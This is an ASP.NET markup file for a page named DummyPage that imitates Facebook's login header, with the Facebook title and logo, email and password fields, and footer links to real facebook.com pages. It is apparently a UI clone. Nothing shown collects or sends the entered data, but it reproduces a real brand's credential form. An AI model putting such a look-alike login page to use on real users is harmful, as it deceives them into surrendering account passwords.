<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="DummyPage.aspx.cs" Inherits="facebook.DummyPage" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">

    
    <link rel="short icon" href="~/images/favlogo.png" type="image/png" />
    <title>Facebook</title>

    <link rel="stylesheet" href="css/DummyPage.css" type="text/css" />

</head>
<body>

    <div id="up">

        <div id="upleft">
            </br>
	&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;
	 <a href="facebookloginpage.aspx">
         <img src="images/logo2.png" height="66px" width="230px" />
     </a>

        </div>


        <div id="upright">
            </br>
		<p style="color: White; font-size: x-small; font-family: arial;">
            &emsp;&nbsp;&nbsp;
		Email or phone
		&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&nbsp;&nbsp;
		Password
        </p>
            &emsp;
		<input type="text" name="usermame" class="checkboxcss">
            &emsp;
		<input type="password" name="passwrd" class="checkboxcss" />
            &nbsp;&nbsp;&nbsp;
		<img src="images/login1.png" style="height=20px; margin-top=10px" />

            <p style="color: White; font-size: x-small; font-family: arial; cursor: pointer">
                </br>
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		<input type="checkbox" name="keepLogged" value="login">
		&nbsp;
		Keep me logged in
        </input>
                &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;
		<a href="FindYourAccount.aspx">
            <font color="white">
		Forgot your password?
		</font>
        </a>
            </p>


        </div>
    </div>


    <div id="bdy">
    </div>

    <div id="bordr">
    </div>

    <div class="foot">

        <a href="https://www.facebook.com/mobile/" title="Check out Facebook Mobile.">Mobile</a>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffriends%2Frequests%2F%3Ffcref%3Dffi"
            title="Find anyone on the web.">Find Friends</a> &nbsp;&nbsp;&nbsp; <a href="https://www.facebook.com/badges/"
                title="Embed a Facebook badge on your website.">Badges</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                <a href="https://www.facebook.com/people-search.php" title="Browse our people directory.">People</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.facebook.com/directory/pages/" title="Browse our pages directory.">
                        Pages</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.facebook.com/places/" title="Check out popular places on Facebook.">Places</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://www.facebook.com/games/" title="Check out Facebook games.">
                                Games</a> &nbsp;&nbsp;&nbsp; <a href="https://www.facebook.com/directory/places/" title="Browse our places directory.">Locations</a> &nbsp;&nbsp;&nbsp; <a href="https://www.facebook.com/facebook" title="Read our blog, discover the resource center, and find job opportunities.">About</a> &nbsp;&nbsp;&nbsp;
  
    </div>

    <div class="foot">

        <a href="https://www.facebook.com/advertising/?campaign_id=402047449186&placement=pflo&extra_1=not-admgr-user"
            title="Advertise on Facebook.">Create Ad</a> &nbsp;&nbsp;&nbsp; <a href="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Fpages%2Fcreate%2F%3Fref_type%3Dsitefooter"
                title="Create a Page">Create Page</a> &nbsp;&nbsp;&nbsp; <a href="https://developers.facebook.com/?ref=pf"
                    title="Develop on our platform.">Developers</a> &nbsp;&nbsp;&nbsp; <a href="https://www.facebook.com/careers/?ref=pf"
                        title="Make your next career move to our awesome company.">Careers</a>
        &nbsp;&nbsp;&nbsp; <a href="https://www.facebook.com/policy.php" title="Learn about your privacy and Facebook.">Privacy</a> &nbsp;&nbsp;&nbsp; <a href="https://www.facebook.com/help/cookies/?ref=sitefooter"
            title="Learn about cookies and Facebook.">Cookies</a> &nbsp;&nbsp;&nbsp; <a href="https://www.facebook.com/policies/?ref=pf"
                accesskey="9" title="Review our terms and policies.">Terms</a> &nbsp;&nbsp;&nbsp;&nbsp;
                <a href="https://www.facebook.com/help/?ref=pf" accesskey="0" title="Visit our Help Center.">Help</a> &nbsp;&nbsp;&nbsp;
    </div>



    <div class="foot">
        <span>Facebook &copy 2014</span> &middot; <a href="#" title="Use Facebook in another language." role="button">English (US)</a>


    </div>



</body>
</html>
